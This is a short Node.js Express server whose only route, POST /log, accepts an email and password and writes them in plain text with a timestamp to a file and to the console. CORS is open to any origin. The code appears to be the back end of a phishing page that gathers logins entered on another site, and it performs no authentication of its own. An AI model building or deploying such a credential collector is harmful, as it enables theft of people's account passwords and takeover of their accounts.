const express = require('express');
const fs = require('fs');
const cors = require('cors'); // Make sure this is here
const app = express();

// Allow all origins (we’ll change this later)
app.use(cors());

app.use(express.json());

app.post('/log', function(req, res) {
    const email = req.body.email;
    const password = req.body.password;
    const log = "Email: " + email + ", Password: " + password + ", Time: " + new Date() + "\n";

    fs.appendFile('logs.txt', log, function(err) {
        if (err) console.log("Error saving!");
    });

    console.log(log);
    res.send('Done');
});

app.listen(process.env.PORT || 3000, function() {
    console.log("Server started!");
});